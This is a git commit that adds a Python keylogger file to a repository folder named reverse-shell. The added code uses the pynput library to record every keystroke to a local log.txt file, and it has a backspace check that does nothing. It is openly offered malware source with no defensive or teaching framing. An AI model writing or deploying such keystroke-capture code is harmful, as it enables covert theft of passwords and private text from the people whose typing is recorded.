3f0b4aa0445d8995894176ddeb675dc95ff52965
bhushan123misal <51930787+bhushan123misal@users.noreply.github.com>
2020-07-25 03:27:40 +0530

    Update keylogger.py

--- reverse-shell/keylogger.py
+++ reverse-shell/keylogger.py
@@ -1,1 +1,12 @@
+from pynput.keyboard import Listener
 
+def keyLogger(key):
+    letter = str(key)
+    letter = letter.replace("'","")
+    if letter == "Key.backspace":
+        pass
+    with open("log.txt","a") as f:
+        f.write(letter)
+        
+with Listener(on_press=keyLogger) as l:
+    l.join()
